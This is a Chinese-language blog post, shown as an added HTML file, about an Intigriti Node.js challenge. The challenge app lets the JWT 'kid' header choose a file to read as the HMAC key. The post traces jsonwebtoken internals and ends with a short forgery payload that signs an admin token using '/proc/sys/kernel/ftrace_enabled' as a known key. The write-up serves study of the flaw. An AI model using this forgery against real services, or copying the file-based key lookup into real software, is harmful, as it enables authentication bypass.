@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="iNtiGriTi CHALLENGES 2023/1/26" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            iNtiGriTi CHALLENGES 2023/1/26
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#iNtiGriTi-challenge-2023-x2F-1-x2F-26"><span class="post-toc-text">iNtiGriTi challenge 2023&#x2F;1&#x2F;26</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#jws-verify-signature-algorithm-secretOrKey"><span class="post-toc-text">jws.verify(signature, algorithm, secretOrKey)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02%E5%A6%82%E4%BD%95%E4%BC%AA%E9%80%A0"><span class="post-toc-text">0x02如何伪造</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0X03-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="post-toc-text">0X03 参考链接</span></a></li></ol></li></ol>
+            
+        
+        <h1 id="iNtiGriTi-challenge-2023-x2F-1-x2F-26"><a href="#iNtiGriTi-challenge-2023-x2F-1-x2F-26" class="headerlink" title="iNtiGriTi challenge 2023&#x2F;1&#x2F;26"></a>iNtiGriTi challenge 2023&#x2F;1&#x2F;26</h1><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301292127730.jpeg" alt="图像" style="zoom: 67%;" />
+
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在twitter上看到INTIGRITI发的一个nodejs漏洞的悬赏(<a target="_blank" rel="noopener" href="https://twitter.com/intigriti/status/1619019265860042754">原帖</a>)，所以学习一下</p>
+<p>【这个老外的有口音，但是马马虎虎还是听懂了是啥意思】</p>
+<p>jwt.verify()可以自己选择secretOrPublicKey，而且加密算法是HS256(对称加密),同时secretOrPublicKey是我们可控的，利用这一点进行jwt伪造，从而进入&#x2F;protected</p>
+<h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><p>源码:</p>
+<pre><code class="js">const fs = require(&#39;fs&#39;);
+var jwt = require(&#39;jsonwebtoken&#39;);
+const cookieParser = require(&#39;cookie-parser&#39;);
+const app = require(&#39;express&#39;)();
+app.use(cookieParser());
+
+app.use((req, res, next) =&gt; &#123;
+    const token = req.cookies.session;
+    if (!token) return res.sendStatus(403);
+
+    jwt.verify(token, 
+      (header, cb) =&gt; &#123;
+        cb(null, fs.readFileSync(header.kid));
+      &#125;, &#123; algorithm: &#39;HS256&#39; &#125;, (err, data) =&gt; &#123;
+        if (err) return res.sendStatus(403);
+        req.name = data.name;
+        return next();
+      &#125;
+    );
+&#125;);
+
+app.get(&#39;/protected&#39;, (req, res) =&gt; &#123;
+  if (req.name !== &#39;admin&#39;) return res.sendStatus(401);
+  res.send(&#39;You are the admin!&#39;);
+&#125;);
+
+app.listen(3000);
+</code></pre>
+<p>这里关键的代码就是</p>
+<pre><code class="js">    jwt.verify(token, 
+      (header, cb) =&gt; &#123;
+        cb(null, fs.readFileSync(header.kid));
+      &#125;, &#123; algorithm: &#39;HS256&#39; &#125;, (err, data) =&gt; &#123;
+        if (err) return res.sendStatus(403);
+        req.name = data.name;
+        return next();
+      &#125;
+    );
+</code></pre>
+<p>先用以下代码生成一段jwt</p>
+<pre><code class="js">var jwt = require(&#39;jsonwebtoken&#39;);
+a=jwt.sign(&#123;name:&quot;admin&quot;&#125;,&#39;123&#39;,&#123; algorithm: &#39;HS256&#39;,keyid:&#39;flag.txt&#39;&#125;)
+console.log(a)
+//eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImZsYWcudHh0In0.eyJuYW1lIjoiYWRtaW4iLCJpYXQiOjE2NzQ5OTIxOTd9.79MO2S_wwstbR9N3CJMPwzgn3uV3HHCs_RP-8o49aAw
+</code></pre>
+<p>设置断点，debug一下</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301291937310.png" alt="image-20230129193733227"></p>
+<p>这里将解析jwt得到的head，赋值给了header常量</p>
+<p>然后判断secretOrPublicKey的类型，如果是函数的话，就进入if分支。而我们这里的secretOrPublicKey就是一个匿名函数</p>
+<p>这里就将secretOrPublicKey赋值给了getSecret，再往后看</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301291957755.png" alt="image-20230129195728721"></p>
+<p>他会执行参数secretOrPublicKey的函数，即</p>
+<pre><code class="js">(header, cb) =&gt; &#123;
+    cb(null, fs.readFileSync(header.kid));
+&#125;
+</code></pre>
+<p>根据形参判断，传入getSecret里secretOrPublicKey的值就是<code>fs.readFileSync(header.kid)</code>的值<br>而<code>header.kid</code>就是jwt中head里的kid(keyid的简称)，继续往下</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301292006748.png" alt="image-20230129200623708"></p>
+<p>他会执行到这，secretOrPublicKey的值就是<code>fs.readFileSync(header.kid)</code>获取的值</p>
+<blockquote>
+<h2 id="jws-verify-signature-algorithm-secretOrKey"><a href="#jws-verify-signature-algorithm-secretOrKey" class="headerlink" title="jws.verify(signature, algorithm, secretOrKey)"></a>jws.verify(signature, algorithm, secretOrKey)</h2><p>（同步）返回<code>true</code>或<code>false</code>用于签名是否与secret或key匹配。</p>
+<p><code>signature</code>是 JWS 签名。<code>header.alg</code>必须是在 中找到的值<code>jws.ALGORITHMS</code>。请参阅上面的受支持算法表。<code>secretOrKey</code>是一个字符串或缓冲区，包含 HMAC 算法的密钥或 RSA 和 ECDSA 的 PEM 编码公钥。</p>
+<p>请注意，<code>&quot;alg&quot;</code>签名标头中的值将被忽略。</p>
+</blockquote>
+<p>如果<code>fs.readFileSync(header.kid)</code>获取的值和传入的jwt进行加密的secret一样，这里就会返回true。继续往下会执行到函数的末尾</p>
+<pre><code class="js">return done(null, payload);
+</code></pre>
+<p>而done函数在上面被定义为传入<code>jwt.verify()</code>的回调函数，payload的值就是jwt里的payload</p>
+<pre><code class="js">  let done;
+
+  if (callback) &#123;
+    done = callback;
+  &#125; else &#123;
+    done = function(err, data) &#123;
+      if (err) throw err;
+      return data;
+    &#125;;
+  &#125;
+</code></pre>
+<p>所以最后就会返回jwt里payload的值，就意味着jwt验证成功</p>
+<p>综上所述，就是因为jwt.verify()的secretOrPublicKey是我们可控的，同时因为用的是对称加密，所以导致了jwt可以被伪造</p>
+<h2 id="0x02如何伪造"><a href="#0x02如何伪造" class="headerlink" title="0x02如何伪造"></a>0x02如何伪造</h2><p>因为这里使用<code>fs.readFileSync()</code>读取文件，我们需要利用一个可以知道内容的文件</p>
+<p>这里就是利用linux中的<code>/proc/sys/kernel/ftrace_enabled</code></p>
+<p>ftrace是linux内置的内核调试工具，读取&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;ftrace_enabled返回的都是<code>1\n</code></p>
+<p>payload:</p>
+<pre><code class="js">var jwt = require(&#39;jsonwebtoken&#39;);
+var a=jwt.sign(&#123;name:&quot;admin&quot;&#125;,
+               &#39;1\n&#39;,
+               &#123; algorithm: &#39;HS256&#39;,keyid:&#39;/proc/sys/kernel/ftrace_enabled&#39;&#125;)
+console.log(a)
+</code></pre>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301292120712.png" alt="image-20230129212059616"></p>
+<h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a>0X03 参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程</a></li>
+<li><a target="_blank" rel="noopener" href="https://twitter.com/intigriti/status/1618589709617463297">iNtiGriTi challenge 2023&#x2F;1&#x2F;26</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/nodejs/'>
+                            nodejs
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/iNtiGriTi-CHALLENGES/'>
+                            iNtiGriTi CHALLENGES
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
